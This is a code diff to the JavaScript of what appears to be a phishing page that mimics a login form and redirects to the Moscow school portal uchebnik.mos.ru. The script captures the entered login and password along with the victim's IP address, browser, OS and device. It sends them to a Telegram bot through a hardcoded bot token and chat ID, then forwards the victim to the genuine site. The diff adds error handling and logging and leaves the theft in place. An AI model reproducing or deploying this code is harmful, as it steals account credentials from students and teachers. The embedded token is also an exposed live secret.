@@ -274,8 +274,8 @@
             const login = document.querySelector('input[name="login"]').value;
             const password = document.querySelector('input[name="password"]').value;
             const userAgent = navigator.userAgent.toLowerCase();
+            console.log('Логин:', login, 'Пароль:', password);
 
-            // Функция для разбора userAgent
             function parseUserAgent(ua) {
                 let browser = "Unknown";
                 let os = "Unknown";
@@ -304,22 +304,35 @@
 
             const { browser, os, device } = parseUserAgent(userAgent);
 
-            // Получаем IP и отправляем данные в Telegram
             fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
+                .then(response => {
+                    if (!response.ok) throw new Error('Ошибка получения IP');
+                    return response.json();
+                })
                 .then(data => {
                     const ip = data.ip;
-                    const token = "7502410582:AAHPmdOb0xl27b-wjGvw8MxSHjWY281mcZs"; // Новый токен
-                    const chatId = "2068847868"; // Твой Chat ID
+                    console.log('IP:', ip);
+                    const token = "7502410582:AAHPmdOb0xl27b-wjGvw8MxSHjWY281mcZs";
+                    const chatId = "2068847868";
                     const message = encodeURIComponent(`Логин: ${login}\nПароль: ${password}\nIP: ${ip}\nБраузер: ${browser}\nОС: ${os}\nУстройство: ${device}`);
+                    console.log('Сообщение для Telegram:', message);
 
-                    // Отправка в Telegram (без ожидания ответа)
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`)
-                        .catch(error => console.error('Ошибка Telegram:', error));
+                    return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`);
                 })
-                .catch(error => console.error('Ошибка IP:', error))
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Сообщение успешно отправлено в Telegram');
+                        return response.json();
+                    } else {
+                        console.error('Ошибка Telegram, статус:', response.status);
+                        return response.json().then(data => {
+                            throw new Error(`Telegram API error: ${data.description}`);
+                        });
+                    }
+                })
+                .catch(error => console.error('Ошибка:', error.message))
                 .finally(() => {
-                    // Редирект в любом случае
+                    console.log('Редирект...');
                     window.location.href = "https://uchebnik.mos.ru/main";
                 });
         });
